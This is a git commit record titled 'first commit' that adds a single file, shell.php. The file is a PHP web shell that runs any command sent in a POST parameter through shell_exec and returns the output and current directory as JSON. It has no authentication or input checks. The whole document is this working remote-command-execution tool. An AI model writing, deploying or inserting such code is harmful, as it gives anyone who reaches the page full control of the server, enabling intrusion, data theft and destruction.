00898c7ffbd534360ff814657ea82271e282a409
Alan Carrer <carrer.a@outlook.fr>
2020-02-29 18:37:51 +0100

    first commit

---
+++ shell.php
@@ -0,0 +1,19 @@
+
+<?php
+    $path = $_POST['path'];
+    $cmd = $_POST['cmd'];
+    $output = null;
+
+    if(substr($cmd, 0, 2) == 'cd'){
+        chdir($path . '/' . substr($cmd, 3));
+    } else{
+        chdir($path);
+        $output = shell_exec($_POST['cmd']);
+    }
+
+    $dir = getcwd();
+    $array = array(
+        'cmdResult' => json_encode($output),
+        'path' => $dir);
+    echo json_encode($array);
+?>
